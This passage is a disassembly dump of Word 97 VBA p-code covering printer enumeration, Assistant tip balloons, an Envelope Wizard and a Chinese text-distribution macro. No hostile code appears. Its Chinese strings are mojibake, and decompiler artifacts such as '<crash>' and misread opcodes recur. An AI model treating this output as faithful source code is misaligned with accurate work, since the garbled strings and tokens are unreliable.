' 	Paren 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	OptionBase 
' 	Ld iTotalNumPrinters 
' 	LitDI2 0x000A 
' 	Add 
' 	Redim (Preserve) rgstrPrinterNames 0x0001 (As Variant)
' 	EndIf 
' Line #2306:
' 	LitStr 0x0002 "\\"
' 	Ld strPrinterServer 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld strPrinterName 
' 	Concat 
' 	ArgsLd UCase$ 0x0001 
' 	Ld iTotalNumPrinters 
' 	ArgsSt rgstrPrinterNames 0x0001 
' Line #2307:
' 	Ld iTotalNumPrinters 
' 	LitDI2 0x0001 
' 	Add 
' 	St iTotalNumPrinters 
' Line #2308:
' 	EndIfBlock 
' Line #2309:
' 	EndIfBlock 
' Line #2310:
' Line #2311:
' 	Ld dwPrinterIndex 
' 	LitDI2 0x0001 
' 	Add 
' 	St dwPrinterIndex 
' Line #2312:
' 	Wend 
' Line #2313:
' Line #2314:
' 	Label LClosePrinterServersKey 
' Line #2315:
' 	Ld hKeyPrinterServers 
' 	Paren 
' 	ArgsCall RegCloseKey 0x0001 
' Line #2316:
' Line #2317:
' 	Label LEndGetProviderPrinters 
' Line #2318:
' Line #2319:
' 	EndSub 
' Line #2320:
' Line #2321:
' 	FuncDefn (Sub GetRemotePrinterNames(hKey As Long))
' Line #2322:
' 	Dim 
' 	VarDefn dwProviderIndex (As Long)
' Line #2323:
' 	Dim 
' 	VarDefn cbProviderName (As Long)
' Line #2324:
' 	Dim 
' 	VarDefn lpProviderName (As String)
' Line #2325:
' 	Dim 
' 	VarDefn lRet (As Long)
' 	VarDefn iLenProviderName (As Integer) 0x0028
' Line #2326:
' Line #2327:
' 	Dim 
' 	VarDefn strProviderName (As String)
' Line #2328:
' Line #2329:
' 	LitDI2 0x0100 
' 	St cbProviderName 
' Line #2330:
' 	LitDI2 0x0000 
' 	St dwProviderIndex 
' Line #2331:
' Line #2332:
' 	Ld ERROR_SUCCESS 
' 	St lRet 
' Line #2333:
' Line #2334:
' 	QuoteRem 0x0004 0x0048 "get the list of providers and call GetProviderPrinters for each provider"
' Line #2335:
' 	Ld lRet 
' 	Ld ERROR_SUCCESS 
' 	Eq 
' 	Paren 
' 	While 
' Line #2336:
' 	Ld cbProviderName 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St lpProviderName 
' Line #2337:
' Line #2338:
' 	Ld hKey 
' 	Ld dwProviderIndex 
' 	Ld lpProviderName 
' 	Ld cbProviderName 
' 	ArgsLd RegEnumKey 0x0004 
' 	St lRet 
' Line #2339:
' Line #2340:
' 	Ld lRet 
' 	Ld ERROR_SUCCESS 
' 	Ne 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoTo LEnd 
' 	EndIf 
' Line #2341:
' Line #2342:
' 	Ld lpProviderName 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr 
' 	St iLenProviderName 
' 	QuoteRem 0x003A 0x0017 "length of provider name"
' Line #2343:
' Line #2344:
' 	Ld iLenProviderName 
' 	LitDI2 0x0001 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #2345:
' 	Ld lpProviderName 
' 	Ld iLenProviderName 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St strProviderName 
' Line #2346:
' 	Ld strProviderName 
' 	Paren 
' 	ArgsCall GetProviderPrinters 0x0001 
' Line #2347:
' 	EndIfBlock 
' Line #2348:
' Line #2349:
' 	Ld dwProviderIndex 
' 	LitDI2 0x0001 
' 	Add 
' 	St dwProviderIndex 
' Line #2350:
' 	Wend 
' Line #2351:
' Line #2352:
' 	Label LEnd 
' Line #2353:
' Line #2354:
' 	EndSub 
' Line #2355:
' Line #2356:
' 	FuncDefn (Sub GetLocalPrinters())
' Line #2357:
' 	Dim 
' 	VarDefn hr (As Long)
' Line #2358:
' 	Dim 
' 	VarDefn hSubKey (As Long)
' Line #2359:
' Line #2360:
' 	Ld HKEY_LOCAL_MACHINE 
' 	Ld strREG_LOCAL_PRINTERS 
' 	Ld hSubKey 
' 	ArgsLd RegOpenKey 0x0003 
' 	St hr 
' Line #2361:
' 	Ld hr 
' 	Ld ERROR_SUCCESS 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #2362:
' Line #2363:
' 	Ld hSubKey 
' 	Paren 
' 	ArgsCall GetLocalPrinterNames 0x0001 
' Line #2364:
' Line #2365:
' 	Ld hSubKey 
' 	Paren 
' 	ArgsCall RegCloseKey 0x0001 
' Line #2366:
' Line #2367:
' 	EndSub 
' Line #2368:
' Line #2369:
' 	FuncDefn (Sub GetLocalPrinterNames(hKey As Long))
' Line #2370:
' Line #2371:
' 	Dim 
' 	VarDefn lpPrinterName (As String)
' 	VarDefn strPrinterName (As String)
' Line #2372:
' 	Dim 
' 	VarDefn strPrinter (As String)
' Line #2373:
' 	Dim 
' 	VarDefn cbPrinterName (As Long)
' Line #2374:
' 	Dim 
' 	VarDefn dwPrinterIndex (As Long)
' Line #2375:
' 	Dim 
' 	VarDefn lRet (As Long)
' 	VarDefn iLenPrinterName (As Integer)
' Line #2376:
' Line #2377:
' 	LitDI2 0x0100 
' 	St cbPrinterName 
' Line #2378:
' 	LitDI2 0x0000 
' 	St dwPrinterIndex 
' Line #2379:
' Line #2380:
' 	OnError (Resume Next) 
' Line #2381:
' Line #2382:
' 	Ld ERROR_SUCCESS 
' 	St lRet 
' Line #2383:
' 	Ld lRet 
' 	Ld ERROR_SUCCESS 
' 	Eq 
' 	Paren 
' 	While 
' Line #2384:
' 	Ld cbPrinterName 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St lpPrinterName 
' Line #2385:
' Line #2386:
' 	Ld hKey 
' 	Ld dwPrinterIndex 
' 	Ld lpPrinterName 
' 	Ld cbPrinterName 
' 	ArgsLd RegEnumKey 0x0004 
' 	St lRet 
' Line #2387:
' Line #2388:
' 	Ld lRet 
' 	Ld ERROR_SUCCESS 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo LEndLocalPrinters 
' 	EndIf 
' Line #2389:
' Line #2390:
' 	Ld lpPrinterName 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr 
' 	St iLenPrinterName 
' Line #2391:
' 	Ld iLenPrinterName 
' 	LitDI2 0x0001 
' 	Gt 
' 	Paren 
' 	IfBlock 
' 	QuoteRem 0x0026 0x0007 "no name"
' Line #2392:
' 	Ld lpPrinterName 
' 	Ld iLenPrinterName 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St strPrinter 
' Line #2393:
' 	LitStr 0x0000 ""
' 	St strPrinterName 
' Line #2394:
' 	LitStr 0x0000 ""
' 	LitStr 0x0013 "HKEY_LOCAL_MACHINE\"
' 	Ld strREG_LOCAL_PRINTERS 
' 	Concat 
' 	Ld strPrinter 
' 	Concat 
' 	LitStr 0x0004 "Name"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St strPrinterName 
' Line #2395:
' Line #2396:
' 	Ld strPrinterName 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x002D 0x001A "if valid name, add to list"
' Line #2397:
' 	LineCont 0x0004 09 00 14 00
' 	Ld iTotalNumPrinters 
' 	LitDI2 0x000A 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	OptionBase 
' 	Ld iTotalNumPrinters 
' 	LitDI2 0x000A 
' 	Add 
' 	Redim (Preserve) rgstrPrinterNames 0x0001 (As Variant)
' 	EndIf 
' Line #2398:
' Line #2399:
' 	Ld strPrinterName 
' 	ArgsLd UCase$ 0x0001 
' 	Ld iTotalNumPrinters 
' 	ArgsSt rgstrPrinterNames 0x0001 
' Line #2400:
' Line #2401:
' 	Ld iTotalNumPrinters 
' 	LitDI2 0x0001 
' 	Add 
' 	St iTotalNumPrinters 
' Line #2402:
' 	EndIfBlock 
' Line #2403:
' 	EndIfBlock 
' Line #2404:
' Line #2405:
' 	Ld dwPrinterIndex 
' 	LitDI2 0x0001 
' 	Add 
' 	St dwPrinterIndex 
' Line #2406:
' 	Wend 
' Line #2407:
' Line #2408:
' Line #2409:
' 	Label LEndLocalPrinters 
' Line #2410:
' 	EndSub 
' Line #2411:
' Line #2412:
' 	QuoteRem 0x0000 0x0047 "displays post wizard tip in an autodown balloon if Assistant is visible"
' Line #2413:
' 	FuncDefn (Public Sub DisplayPostWizTip(strTip As String, fMsgBox As Boolean))
' Line #2414:
' Line #2415:
' 	Dim 
' 	VarDefn objTipBalloon (As Balloon)
' Line #2416:
' Line #2417:
' 	OnError TipError 
' Line #2418:
' 	Ld fMsgBox 
' 	IfBlock 
' Line #2419:
' 	Ld Assistant 
' 	MemLd Visible 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo TipError 
' 	EndIf 
' Line #2420:
' 	EndIfBlock 
' Line #2421:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set objTipBalloon 
' Line #2422:
' 	StartWithExpr 
' 	Ld objTipBalloon 
' 	With 
' Line #2423:
' 	Ld msoModeAutoDown 
' 	MemStWith Mode 
' Line #2424:
' 	Ld strWizName 
' 	MemStWith Heading 
' Line #2425:
' 	Ld msoButtonSetNone 
' 	MemStWith Button 
' Line #2426:
' 	Ld strTip 
' 	MemStWith Then 
' Line #2427:
' 	EndWith 
' Line #2428:
' 	Ld objTipBalloon 
' 	ArgsMemCall Show 0x0000 
' Line #2429:
' Line #2430:
' 	Ld Assistant 
' 	MemLd BalloonError 
' 	Ld msoBalloonErrorNone 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo TipError 
' 	EndIf 
' Line #2431:
' Line #2432:
' 	Label TipError 
' Line #2433:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #2434:
' 	Ld fMsgBox 
' 	If 
' 	BoSImplicit 
' 	Ld strTip 
' 	Ld vbInformation 
' 	Ld vbOKOnly 
' 	Add 
' 	Ld vbApplicationModal 
' 	Add 
' 	Ld strWizName 
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #2435:
' 	EndSub 
' Line #2436:
' Line #2437:
' 	FuncDefn (Private Function FInvalidMainDoc(objMainDoc As , strDocName As String, id_FFFE As Boolean) As Boolean)
' Line #2438:
' 	OnError NoDoc 
' Line #2439:
' 	SetStmt 
' 	Ld strDocName 
' 	Ld Application 
' 	ArgsMemLd Documents 0x0001 
' 	Set objMainDoc 
' Line #2440:
' 	LitVarSpecial (False)
' 	St FInvalidMainDoc 
' Line #2441:
' 	ExitFunc 
' Line #2442:
' 	Label NoDoc 
' Line #2443:
' 	Ld strERR_NO_MAIN_DOC1 
' 	Ld strDocName 
' 	Concat 
' 	Ld strERR_NO_MAIN_DOC2 
' 	Concat 
' 	ArgsCall DisplayErrorMsg 0x0001 
' Line #2444:
' 	LitVarSpecial (True)
' 	St FInvalidMainDoc 
' Line #2445:
' 	EndFunc 
' Line #2446:
' Line #2447:
' 	FuncDefn (Public Sub DeleteCmdBar(strCmdBarName))
' Line #2448:
' 	OnError (Resume Next) 
' Line #2449:
' 	Ld strCmdBarName 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #2450:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #2451:
' 	EndSub 
' Line #2452:
' Line #2453:
' Line #2454:
' 	FuncDefn (Function GetCurFont(rgn As , id_FFFE As ) As <crash>)
' Line #2455:
' 	OnError LError 
' Line #2456:
' 	Ld rgn 
' 	MemLd Font 
' 	MemLd Size 
' 	LitDI4 0x967F 0x0098 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #2457:
' 	LitDI2 0x0001 
' 	Ld rgn 
' 	ArgsMemLd Characters 0x0001 
' 	MemLd Font 
' 	MemLd Size 
' 	LitDI4 0x967F 0x0098 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #2458:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld rgn 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Style 
' 	Ld ActiveDocument 
' 	ArgsMemLd Styles 0x0001 
' 	MemLd Font 
' 	Set GetCurFont 
' Line #2459:
' 	ElseBlock 
' Line #2460:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld rgn 
' 	ArgsMemLd Characters 0x0001 
' 	MemLd Font 
' 	Set GetCurFont 
' Line #2461:
' 	EndIfBlock 
' Line #2462:
' 	ElseBlock 
' Line #2463:
' 	SetStmt 
' 	Ld rgn 
' 	MemLd Font 
' 	Set GetCurFont 
' Line #2464:
' 	EndIfBlock 
' Line #2465:
' 	ExitFunc 
' Line #2466:
' 	Label LError 
' Line #2467:
' 	Ld Err 
' 	MemLd Description 
' 	ArgsCall MsgBox 0x0001 
' Line #2468:
' 	EndFunc 
' Line #2469:
' Line #2470:
' 	QuoteRem 0x0000 0x002E "returns the value stored in registry key strId"
' Line #2471:
' 	FuncDefn (Public Function StrFetchPref(strId As String, id_FFFE As String) As String)
' Line #2472:
' 	OnError LReturnNull 
' Line #2473:
' Line #2474:
' 	LitStr 0x0000 ""
' 	Ld strRegSettingsKey 
' 	Ld strId 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St StrFetchPref 
' Line #2475:
' 	ExitFunc 
' Line #2476:
' 	Label LReturnNull 
' Line #2477:
' 	LitStr 0x0000 ""
' 	St StrFetchPref 
' Line #2478:
' 	EndFunc 
' Line #2479:
' Line #2480:
' 	QuoteRem 0x0000 0x0040 "returns the string stored in strId. If empty, returns strDefault"
' Line #2481:
' 	FuncDefn (Public Function StrRestorePref(strId As String, strDefault As String, id_FFFE As String) As String)
' Line #2482:
' 	Dim 
' 	VarDefn strTemp (As String)
' Line #2483:
' Line #2484:
' 	Ld strId 
' 	ArgsLd StrFetchPref 0x0001 
' 	St strTemp 
' Line #2485:
' 	QuoteRem 0x0004 0x003D " If length is 0, it wasn't in regsistry, so use default value"
' Line #2486:
' 	Ld strTemp 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #2487:
' 	Ld strDefault 
' 	St strTemp 
' Line #2488:
' 	QuoteRem 0x0004 0x0036 " "~" is a placeholder to allow returning empty strings"
' Line #2489:
' 	Ld strTemp 
' 	LitStr 0x0001 "~"
' 	Eq 
' 	ElseIfBlock 
' Line #2490:
' 	LitStr 0x0000 ""
' 	St strTemp 
' Line #2491:
' 	EndIfBlock 
' Line #2492:
' Line #2493:
' 	Ld strTemp 
' 	St StrRestorePref 
' Line #2494:
' 	EndFunc 
' Line #2495:
' Line #2496:
' 	QuoteRem 0x0000 0x0057 " --------------------------------------------------------------------------------------"
' Line #2497:
' 	QuoteRem 0x0000 0x0014 " WORD 97 MINI-WIZARD"
' Line #2498:
' 	QuoteRem 0x0000 0x001E " Envelope Wizard Specific Code"
' Line #2499:
' 	QuoteRem 0x0000 0x0057 " --------------------------------------------------------------------------------------"
' Line #2500:
' Line #2501:
' 	Option  (Explicit)
' Line #2502:
' Line #2503:
' 	QuoteRem 0x0000 0x0057 " --------------------------------------------------------------------------------------"
' Line #2504:
' 	QuoteRem 0x0000 0x000D " DECLARATIONS"
' Line #2505:
' 	QuoteRem 0x0000 0x0057 " --------------------------------------------------------------------------------------"
' Line #2506:
' Line #2507:
' 	Reparse 0x0025 "Public Const strWIZ_NAME = "«H«ÊºëÆF""
' Line #2508:
' 	Reparse 0x004F "Public Const iBALLOON_OPTIONS = 2 ' Number of items in InitialBalloon (First=1)"
' Line #2509:
' 	Reparse 0x0036 "Public Const strBALLOON_HEADING = "Åwªï¨Ï¥Î«H«ÊºëÆF¡C""
' Line #2510:
' 	Reparse 0x0065 "Public Const strOPTION_ONE_ACCELERATOR = "C"   'This is the form accelerator for strInitialBalloon(0)"
' Line #2511:
' 	Reparse 0x0065 "Public Const strOPTION_TWO_ACCELERATOR = "e"   'This is the form accelerator for strInitialBalloon(1)"
' Line #2512:
' 	Dim (Public) 
' 	OptionBase 
' 	Ld iBALLOON_OPTIONS 
' 	VarDefn strInitialBalloon (As String)
' Line #2513:
' 	Dim (Public) 
' 	OptionBase 
' 	Ld iBALLOON_OPTIONS 
' 	VarDefn strHelpTip (As String)
' Line #2514:
' Line #2515:
' 	FuncDefn (Public Sub InitWizardStrings())
' Line #2516:
' Line #2517:
' 	QuoteRem 0x0000 0x004B " NOTE: change constant  iBALLOON_OPTIONS if number of items in list changes"
' Line #2518:
' 	QuoteRem 0x0004 0x001C " Balloon / Form menu options"
' Line #2519:
' 	LitStr 0x000A "«Ø¥ß¤@«H«Ê"
' 	LitDI2 0x0000 
' 	ArgsSt strInitialBalloon 0x0001 
' Line #2520:
' 	LitStr 0x0018 "«Ø¥ß¶l±H²M³æ¤¤ªº©Ò¦³«H«Ê"
' 	LitDI2 0x0001 
' 	ArgsSt strInitialBalloon 0x0001 
' Line #2521:
' Line #2522:
' 	QuoteRem 0x0004 0x0018 " Assistant help messages"
' Line #2523:
' 	LitStr 0x00A7 "½ÐÁä¤J«H«Ê¤W±H¥ó¤H¤Î¦¬¥ó¤Hªº¦a§}¡C©ÎªÌ¬O±q Microsoft Outlook ³sµ¸¤H©Î Microsoft Exchange ­Ó¤H³q°T¿ý¤¤«ö¤@¤U¡u³q°T¿ý¡v«ö¶s¨Ï¥Î¨ä¤¤ªº¦W³æ¡C·í±zÁä¤J¦a§}¤§«á½Ð«ö¡u¦C¦L¡v¡C"
' 	LitDI2 0x0000 
' 	ArgsSt strHelpTip 0x0001 
' Line #2524:
' 	LitStr 0x0076 "±z¥i¥H¨Ï¥Î¦X¨Ö¦C¦Lªº¥\¯à¨Ó«Ø¥ß«H«Ê¡C°²¦p±z»Ý­nÀ°¦£¡A¨º»ò¦b¦X¨Ö¦C¦L¹ï¸Ü¤è¶ô³»ºÝªº»¡©ú±N·|¤Þ¾É±z§¹¦¨Á`¦@¦³¤T¨BÆJªºµ{§Ç¡C"
' 	LitDI2 0x0001 
' 	ArgsSt strHelpTip 0x0001 
' Line #2525:
' Line #2526:
' 	EndSub 
' 	QuoteRem 0x0009 0x0012 " InitWizardStrings"
' Line #2527:
' Line #2528:
' 	FuncDefn (Public Function fnInitialBalloon(iBtn, id_FFFE As Variant))
' Line #2529:
' Line #2530:
' 	QuoteRem 0x0004 0x001E "On Error GoTo ErrorInitBalloon"
' Line #2531:
' Line #2532:
' 	Ld iBtn 
' 	SelectCase 
' Line #2533:
' 	LitDI2 0x0001 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x0014 0x0004 "Exit"
' Line #2534:
' 	Ld wdDoNotSaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #2535:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000F 0x0019 " Open the envelope dialog"
' Line #2536:
' 	Ld fAssistantAvailable 
' 	If 
' 	BoSImplicit 
' 	ArgsCall ShowAssistantTip 0x0000 
' 	EndIf 
' Line #2537:
' 	Ld wdDialogToolsCreateEnvelope 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #2538:
' 	Ld fAssistantAvailable 
' 	If 
' 	BoSImplicit 
' 	Ld objHelpTipBalloon 
' 	ArgsMemCall Close 0x0000 
' 	EndIf 
' Line #2539:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000F 0x0020 " Start a Mail Merge to envelopes"
' Line #2540:
' 	Ld wdEnvelopes 
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	MemSt MainDocumentType 
' Line #2541:
' 	Ld fAssistantAvailable 
' 	If 
' 	BoSImplicit 
' 	ArgsCall ShowAssistantTip 0x0000 
' 	EndIf 
' Line #2542:
' 	Ld wdDialogMailMergeHelper 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #2543:
' 	Ld fAssistantAvailable 
' 	If 
' 	BoSImplicit 
' 	Ld objHelpTipBalloon 
' 	ArgsMemCall Close 0x0000 
' 	EndIf 
' Line #2544:
' 	EndSelect 
' Line #2545:
' 	ExitFunc 
' Line #2546:
' Line #2547:
' 	EndFunc 
' 	QuoteRem 0x000D 0x0011 " fnInitialBalloon"
' Line #2548:
' Line #2549:
' 	QuoteRem 0x0000 0x001B " End Envelope Wizard Module"
' Line #2550:
' 	Dim (Private Const) 
' 	LitStr 0x000A "¤å¦r§¡µ¥¤À"
' 	VarDefn SZ_MACRONAME
' Line #2551:
' 	Reparse 0x001C "Global iPrevChars As Integer"
' Line #2552:
' Line #2553:
' 	FuncDefn (Sub Insert())
' Line #2554:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #2555:
' 	Dim 
' 	VarDefn para (As Paragraph)
' Line #2556:
' 	Dim 
' 	VarDefn fld (As Field)
' Line #2557:
' Line #2558:
' 	OnError LError 
' Line #2559:
' Line #2560:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #2561:
' 	Ld wdCursorWait 
' 	Ld System 
' 	MemSt Cursor 
' Line #2562:
' 	LitDI2 0x0002 
' 	St n 
' Line #2563:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #2564:
' 	Ld Selection 
' 	MemLd Start 
' 	Ld Selection 
' 	MemLd End 
' 	Eq 
' 	Paren 
' 	MemLdWith Then 
' 	LitDI2 0x0015 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #2565:
' 	ParamOmitted 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemCallWith MoveRight 0x0003 
' Line #2566:
' 	EndIfBlock 
' Line #2567:
' Line #2568:
' 	StartForVariable 
' 	Ld fld 
' 	EndForVariable 
' 	MemLdWith Fields 
' 	ForEach 
' Line #2569:
' 	Ld fld 
' 	MemLd Code 
' 	St a$ 
' Line #2570:
' 	Ld a$ 
' 	ArgsLd FIsDistField 0x0001 
' 	Paren 
' 	IfBlock 
' Line #2571:
' 	LitDI2 0x0001 
' 	Ld a$ 
' 	LitStr 0x0001 ","
' 	FnInStr3 
' 	St iTop 
' Line #2572:
' 	LitDI2 0x0001 
' 	Ld a$ 
' 	LitStr 0x0001 ")"
' 	FnInStr3 
' 	LitDI2 0x0001 
' 	Sub 
' 	St iEnd 
' Line #2573:
' 	Ld iEnd 
' 	Ld iTop 
' 	Sub 
' 	St n 
' Line #2574:
' 	LitVarSpecial (True)
' 	Ld dlgDist 
' 	MemLd ID_RESET 
' 	MemSt Enabled 
' Line #2575:
' 	GoTo LSkip 
' Line #2576:
' 	LitDI2 0x0001 
' 	Ld a$ 
' 	LitStr 0x0002 "eq"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #2577:
' 	LitStr 0x000E "¦¹¦r¦ê¥¼§¡µ¥¤À"
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #2578:
' 	GoTo LExit 
' 	BoS 0x0000 
' Line #2579:
' 	EndIfBlock 
' Line #2580:
' 	StartForVariable 
' 	Ld fld 
' 	EndForVariable 
' 	NextVar 
' Line #2581:
' 	LitVarSpecial (False)
' 	Ld dlgDist 
' 	MemLd ID_RESET 
' 	MemSt Enabled 
' Line #2582:
' 	Ld Selection 
' 	MemLd Then 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #2583:
' 	LitStr 0x002C "½Ð¿ï¨ú­n§¡µ¥¤Àªº¦r¦ê¡A¥B¦r¦ê­n¦³¨â­Ó¦r¥H¤W¡C"
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #2584:
' 	GoTo LExit 
' Line #2585:
' 	LineCont 0x0004 0C 00 10 00
' 	Ld Selection 
' 	MemLd Then 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld Selection 
' 	MemLd Then 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #2586:
' 	LitStr 0x0044 "´«¦æ²Å¸¹¡B©w¦ìÂI¤Î¥\¯àÅÜ¼Æ³£¤£ºâ¬O¤@­Ó¦r¡A½Ð­«·s¿ï¾Ü­n§¡µ¥¤Àªº¦r¦ê¡C"
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #2587:
' 	GoTo LExit 
' Line #2588:
' 	LineCont 0x0004 0C 00 10 00
' 	Ld Selection 
' 	MemLd Then 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld Selection 
' 	MemLd Then 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitDI2 0x0009 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #2589:
' 	LitStr 0x0044 "´«¦æ²Å¸¹¡B©w¦ìÂI¤Î¥\¯àÅÜ¼Æ³£¤£ºâ¬O¤@­Ó¦r¡A½Ð­«·s¿ï¾Ü­n§¡µ¥¤Àªº¦r¦ê¡C"
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #2590:
' 	GoTo LExit 
' Line #2591:
' 	EndIfBlock 
' Line #2592:
' 	LitDI2 0x0001 
' 	Ld Selection 
' 	MemLd Then 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #2593:
' 	StartForVariable 
' 	Ld para 
' 	EndForVariable 
' 	MemLdWith Paragraphs 
' 	ForEach 
' Line #2594:
' 	Ld n 
' 	Ld para 
' 	MemLd Range 
' 	MemLd Then 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #2595:
' 	Ld para 
' 	MemLd Range 
' 	MemLd Then 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	St n 
' Line #2596:
' 	EndIfBlock 
' Line #2597:
' 	StartForVariable 
' 	Ld para 
' 	EndForVariable 
' 	NextVar 
' Line #2598:
' 	ElseBlock 
' Line #2599:
' 	Ld Selection 
' 	MemLd Then 
' 	FnLen 
' 	St n 
' Line #2600:
' 	EndIfBlock 
' Line #2601:
' 	Ld n 
' 	Ld iPrevChars 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #2602:
' 	Ld iPrevChars 
' 	St n 
' Line #2603:
' 	EndIfBlock 
' Line #2604:
' 	EndWith 
' Line #2605:
' Line #2606:
' 	Label LSkip 
' Line #2607:
' 	Ld n 
' 	LitDI2 0x0020 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #2608:
' 	LitDI2 0x0020 
' 	St n 
' Line #2609:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	ElseIfBlock 
' Line #2610:
' 	LitDI2 0x0001 
' 	St n 
' Line #2611:
' 	EndIfBlock 
' Line #2612:
' 	Ld n 
' 	Ld dlgDist 
' 	MemLd IDCS_SIZE 
' 	MemSt Value 
' Line #2613:
' 	Ld n 
' 	Ld dlgDist 
' 	MemLd IDCE_SIZE 
' 	MemSt Then 
' Line #2614:
' 	Ld fmIMEModeNoControl 
' 	Ld dlgDist 
' 	MemLd IDCE_SIZE 
' 	MemSt IMEMode 
' Line #2615:
' 	Ld dlgDist 
' 	MemLd IDCE_SIZE 
' 	ArgsMemCall SetFocus 0x0000 
' Line #2616:
' 	LitDI2 0x0000 
' 	Ld dlgDist 
' 	MemLd IDCE_SIZE 
' 	MemSt SelStart 
' Line #2617:
' 	LitDI2 0x0063 
' 	Ld dlgDist 
' 	MemLd IDCE_SIZE 
' 	MemSt SelLength 
' Line #2618:
' Line #2619:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #2620:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #2621:
' Line #2622:
' 	Ld dlgDist 
' 	ArgsMemCall Show 0x0000 
' Line #2623:
' Line #2624:
' 	Label LExit 
' Line #2625:
' 	ExitSub 
' Line #2626:
' 	Label LError 
' Line #2627:
' 	Ld Err 
' 	MemLd Description 
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #2628:
' 	EndSub 
' Line #2629:
' Line #2630:
' 	FuncDefn (Sub Create(n As Integer))
' Line #2631:
' 	Dim 
' 	VarDefn rgn (As Range)
' Line #2632:
' 	Dim 
' 	VarDefn rgnTmp (As Range)
' Line #2633:
' 	Dim 
' 	VarDefn rgnOrg (As Range)
' Line #2634:
' 	Dim 
' 	VarDefn para (As Paragraph)
' Line #2635:
' 	Dim 
' 	VarDefn cmdb (As CommandBar)
' Line #2636:
' Line #2637:
' 	OnError LError 
' Line #2638:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #2639:
